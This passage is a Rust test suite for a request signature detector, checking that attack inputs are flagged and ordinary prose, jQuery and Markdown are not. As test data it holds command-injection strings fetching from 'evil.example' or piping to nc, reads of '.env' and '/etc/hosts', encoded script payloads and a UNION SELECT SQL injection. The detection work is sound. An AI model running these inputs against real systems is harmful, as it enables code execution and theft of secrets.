            "data:text/x-ecmascript;base64,YWxlcnQoMSk=",
        ] {
            let result = detector
                .detect(&request_with(&[("u", value)], &[], None))
                .await
                .unwrap();
            assert!(
                result
                    .pattern_names
                    .contains(&"Base64 Encoded Script".to_string()),
                "{value}: {:?}",
                result.pattern_names
            );
        }
        for value in [
            "data:image/png;foo=bar;charset=utf-8;base64,iVBORw0KGgo=",
            "data:text/plain;foo=bar;base64,aGVsbG8=",
        ] {
            let result = detector
                .detect(&request_with(&[("u", value)], &[], None))
                .await
                .unwrap();
            assert!(!result.matched, "{value}: {:?}", result.pattern_names);
        }
    }

    /// JSONの本文の文字列の値は、デコードしてから調べる（PR #764の
    /// レビュー。本文のままでは`\"`が残り、引用符付きのパラメーターの
    /// data: URIが当たらなかった）
    #[tokio::test]
    async fn test_json_body_string_values_are_checked_decoded() {
        let detector = SignatureDetector::new().await.unwrap();
        let body = r#"{"u":"data:application/javascript;name=\"a b\";base64,YWxlcnQoMSk="}"#;
        let result = detector
            .detect(&request_with(&[], &[], Some(body)))
            .await
            .unwrap();
        assert!(
            result
                .pattern_names
                .contains(&"Base64 Encoded Script".to_string()),
            "{:?}",
            result.pattern_names
        );
        // 入れ子の配列・オブジェクトの中の値も
        let body = r#"{"a":[{"b":"data:text/html;x=\"1\";base64,PHNjcmlwdD4="}]}"#;
        let result = detector
            .detect(&request_with(&[], &[], Some(body)))
            .await
            .unwrap();
        assert!(result.matched, "{:?}", result.pattern_names);
        // 普通の値は当たらない
        let body = r#"{"text":"He said \"hello\" & left; see <b>docs</b>","n":1}"#;
        let result = detector
            .detect(&request_with(&[], &[], Some(body)))
            .await
            .unwrap();
        assert!(!result.matched, "{:?}", result.pattern_names);
    }

    /// Markdownのコード・jQuery・`.ini`で始まる語・設定ファイルの名前を
    /// 含む文は、CMD-002・003・PATH-008に当たらない（#759。以前は
    /// Critical・Highで、HTTP 403になった）
    #[tokio::test]
    async fn test_markdown_code_jquery_and_config_words_are_not_attacks() {
        let detector = SignatureDetector::new().await.unwrap();
        let bodies = [
            r#"{"content":"Use the `id` field and `foo bar`; run `ls` or `cat` to see it"}"#,
            r#"{"content":"<p>`whoami is a command` and `the ls tool`</p>"}"#,
            r#"{"code":"$(document).ready(function(){ $('.x').hide(); $(this).show(); $(window) })"}"#,
            r#"{"content":"See /docs/a.initial and the initial value; web.config or settings.ini in prose","url":"https://example.com/conference.conference"}"#,
        ];
        for body in bodies {
            let result = detector
                .detect(&request_with(&[], &[], Some(body)))
                .await
                .unwrap();
            assert!(!result.matched, "{body}: {:?}", result.pattern_names);
        }
        let result = detector
            .detect(&request_with(&[("q", "initial.value")], &[], None))
            .await
            .unwrap();
        assert!(!result.matched, "{:?}", result.pattern_names);
    }

    /// バッククォート・`$(`の中のコマンドと、パスの中の設定ファイルは、
    /// 引き続き検知する（#759）
    #[tokio::test]
    async fn test_backtick_dollar_paren_and_config_files_are_still_detected() {
        let detector = SignatureDetector::new().await.unwrap();
        let cases = [
            ("q", "`cat /etc/hosts`", "Backtick Command"),
            ("q", "`curl http://evil.example/x`", "Backtick Command"),
            ("q", "`/bin/id`", "Backtick Command"),
            ("q", "` whoami `", "Backtick Command"),
            ("name", "x`id`", "Backtick Command"),
            ("q", "$(id)", "Dollar Parenthesis"),
            ("q", "$(cat /etc/hosts)", "Dollar Parenthesis"),
            ("q", "$( /bin/sh -c 'uname')", "Dollar Parenthesis"),
            ("q", "$(curl http://evil.example/x)", "Dollar Parenthesis"),
            ("file", "../.env", "Config File Access"),
            ("file", "/app/config.ini", "Config File Access"),
            ("file", ".env.local", "Config File Access"),
        ];
        for (key, value, name) in cases {
            let result = detector
                .detect(&request_with(&[(key, value)], &[], None))
                .await
                .unwrap();
            assert!(
                result.pattern_names.contains(&name.to_string()),
                "{value}: {:?}",
                result.pattern_names
            );
            assert!(result.severity >= Severity::High, "{value}");
        }
        for path in ["/.env", "/web.config", "/etc/nginx/nginx.conf"] {
            let mut request = request_with(&[], &[], None);
            request.path = path.to_string();
            let result = detector.detect(&request).await.unwrap();
            assert!(
                result
                    .pattern_names
                    .contains(&"Config File Access".to_string()),
                "{path}: {:?}",
                result.pattern_names
            );
        }
    }

    /// PR #764のレビュー: 数・ファイル名の引数、`$(`の中の演算子、JSONの
    /// 値のファイル名、同じ名前のクエリの値も検知する
    #[tokio::test]
    async fn test_pr764_review_attacks_are_detected() {
        let detector = SignatureDetector::new().await.unwrap();
        let cases = [
            ("q", "x;rm victim.txt", "Shell Command Injection"),
            ("q", "x;kill 1234", "Semicolon Command"),
            ("q", "x; cat notes.txt", "Shell Command Injection"),
            ("q", "x$(id>/tmp/probe)", "Dollar Parenthesis"),
            ("q", "$(id|nc evil 1)", "Dollar Parenthesis"),
            ("q", "$(id;ls)", "Dollar Parenthesis"),
            ("q", "$(whoami&)", "Dollar Parenthesis"),
        ];
        for (key, value, name) in cases {
            let result = detector
                .detect(&request_with(&[(key, value)], &[], None))
                .await
                .unwrap();
            assert!(
                result.pattern_names.contains(&name.to_string()),
                "{value}: {:?}",
                result.pattern_names
            );
        }
        for body in [
            r#"{"file":".env"}"#,
            r#"{"file":"config.ini"}"#,
            "{'f':'app.conf'}",
        ] {
            let result = detector
                .detect(&request_with(&[], &[], Some(body)))
                .await
                .unwrap();
            assert!(
                result
                    .pattern_names
                    .contains(&"Config File Access".to_string()),
                "{body}: {:?}",
                result.pattern_names
            );
        }
        // 同じ名前のクエリの値は、1つずつ調べる
        let result = detector
            .detect(&request_with(&[("q", "x;id"), ("q", "benign")], &[], None))
            .await
            .unwrap();
        assert!(
            result
                .pattern_names
                .contains(&"Shell Command Injection".to_string()),
            "{:?}",
            result.pattern_names
        );
    }

    /// CMD-005は、`rm`に続く普通の語の引数（拡張子なし）も検知する（#774）。
    /// `del`・大文字の`RM`・`; cat lovers`等の普通の文には当たらない
    #[tokio::test]
    async fn test_semicolon_rm_with_a_plain_argument_is_detected() {
        let detector = SignatureDetector::new().await.unwrap();
        for value in ["x;rm victim", "x; rm  victim_dir", "a;rm notes"] {
            let result = detector
                .detect(&request_with(&[("q", value)], &[], None))
                .await
                .unwrap();
            assert!(
                result
                    .pattern_names
                    .contains(&"Semicolon Command".to_string()),
                "{value}: {:?}",
                result.pattern_names
            );
        }
        for body in [
            r#"{"note":"I like dogs; cat lovers disagree"}"#,
            r#"{"note":"films; del Toro directed it"}"#,
            r#"{"note":"boots; RM Williams makes them"}"#,
            r#"{"note":"room; rmdir is not rm"}"#,
        ] {
            let result = detector
                .detect(&request_with(&[], &[], Some(body)))
                .await
                .unwrap();
            assert!(!result.matched, "{body}: {:?}", result.pattern_names);
        }
    }

    /// PR #764のレビューの変更後も、普通の文・jQuery・文の中の設定ファイルの
    /// 名前には当たらない
    #[tokio::test]
    async fn test_pr764_review_ordinary_text_is_not_an_attack() {
        let detector = SignatureDetector::new().await.unwrap();
        for body in [
            r#"{"note":"I like dogs; cat lovers disagree; delivery in 3 days"}"#,
            r#"{"code":"$(document).ready(); $(identity).x; $(idle)"}"#,
            r#"{"content":"edit web.config to add it","title":"web.config tips"}"#,
            r#"{"content":"a=b; id=42; cat=books"}"#,
        ] {
            let result = detector
                .detect(&request_with(&[], &[], Some(body)))
                .await
                .unwrap();
            assert!(!result.matched, "{body}: {:?}", result.pattern_names);
        }
    }

    /// PR #764の4回目のレビュー: 空白を含む設定ファイルのパスと、`kill`の
    /// コマンドを検知する。文の中の語は今までどおり当たらない
    #[tokio::test]
    async fn test_pr764_fourth_review_paths_with_spaces_and_kill() {
        let detector = SignatureDetector::new().await.unwrap();
        for (value, pattern) in [
            ("/app/my config.ini", "Config File Access"),
            (r"C:\app\my settings.conf", "Config File Access"),
            ("$(kill 1234)", "Dollar Parenthesis"),
            ("x&&kill 1234", "Shell Command Injection"),
        ] {
            let result = detector
                .detect(&request_with(&[("file", value)], &[], None))
                .await
                .unwrap();
            assert!(
                result.pattern_names.contains(&pattern.to_string()),
                "{value}: {:?}",
                result.pattern_names
            );
        }
        // JSONの本文のまま調べても、値の境目を越えて当てない（PR #764の
        // 5回目のレビュー）
        for body in [
            r#"{"url":"https://example.com","text":"edit web.config"}"#,
            r#"{"path":"/docs/a","note":"see settings.ini"}"#,
        ] {
            let result = detector
                .detect(&request_with(&[], &[], Some(body)))
                .await
                .unwrap();
            assert!(!result.matched, "{body}: {:?}", result.pattern_names);
        }
        let body = r#"{"file":"/app/my config.ini"}"#;
        let result = detector
            .detect(&request_with(&[], &[], Some(body)))
            .await
            .unwrap();
        assert!(result.matched, "{:?}", result.pattern_names);
        for value in [
            "/docs/a.initial",
            "web.config tips",
            "docs/notes about web.config tips",
            "$(document)",
            "I kill time; kill switch",
        ] {
            // 文はJSONの本文の値として調べる（クエリは`q=...`の形でも調べ、
            // `=`の後の名前はパスとして扱うため。前からの動き）
            let body = serde_json::json!({ "text": value }).to_string();
            let result = detector
                .detect(&request_with(&[], &[], Some(&body)))
                .await
                .unwrap();
            assert!(!result.matched, "{value}: {:?}", result.pattern_names);
        }
    }

    /// カスタムルールだけが一致したら、そのルールの検知タイプを返す。
    /// 組み込みと名前が重なっても、一致していない組み込みの型にしない（#760）
    #[tokio::test]
    async fn test_custom_rule_detection_type_is_the_matched_rule() {
        fn login_flood(request: &RequestData) -> bool {
            request.path == "/login"
        }
        let mut request = request_with(&[], &[], None);
        request.path = "/login".to_string();
        for name in ["Login Flood", "UNION SELECT Attack"] {
            let mut detector = SignatureDetector::new().await.unwrap();
            detector.add_custom_rule(CustomRule {
                id: "CUSTOM-1".to_string(),
                name: name.to_string(),
                matcher: login_flood,
                detection_type: DetectionType::BruteForce,
                severity: Severity::High,
            });
            let result = detector.detect(&request).await.unwrap();
            assert!(result.matched);
            assert_eq!(result.detection_type, DetectionType::BruteForce, "{name}");
        }

        // 組み込みが一致すれば、これまでどおり組み込みの型
        let mut detector = SignatureDetector::new().await.unwrap();
        detector.add_custom_rule(CustomRule {
            id: "CUSTOM-1".to_string(),
            name: "Login Flood".to_string(),
            matcher: |_| true,
            detection_type: DetectionType::BruteForce,
            severity: Severity::Low,
        });
        let result = detector
            .detect(&request_with(&[("id", "1 UNION SELECT x")], &[], None))
            .await
            .unwrap();
        assert_eq!(result.detection_type, DetectionType::SqlInjection);
    }
}
